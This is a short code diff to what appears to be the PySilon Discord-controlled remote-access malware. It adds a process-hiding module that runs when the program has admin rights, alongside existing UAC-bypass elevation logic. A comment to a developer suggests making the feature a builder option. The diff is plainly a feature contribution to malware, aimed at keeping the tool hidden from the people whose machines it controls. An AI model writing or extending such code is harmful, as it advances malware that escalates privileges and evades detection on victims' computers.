@@ -8,6 +8,7 @@ from discord.ext import commands
 from urllib.request import urlopen
 import resources.modules.misc as pysilon_misc
 import resources.modules.uac_bypass as uac_bypass
+import resources.modules.hideProcess as proc_hider
 import resources.modules.protections as pysilon_protections
 
 def IsAdmin() -> bool:
@@ -23,6 +24,9 @@ if not IsAdmin():
     if uac_bypass.GetSelf()[1]:
         if uac_bypass.UACbypass():
             os._exit(0)
+else:                                                        # note for mategol: an option on compiler settings should be 
+    proccess_was_hidden = False                              # added for users to be able to turn this on / off in which case,
+    if proc_hider.hide_process(): proccess_was_hidden = True # the builder should be removing these lines if the feature is off | alternate implementations are also possibles.
 
 client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all())
 
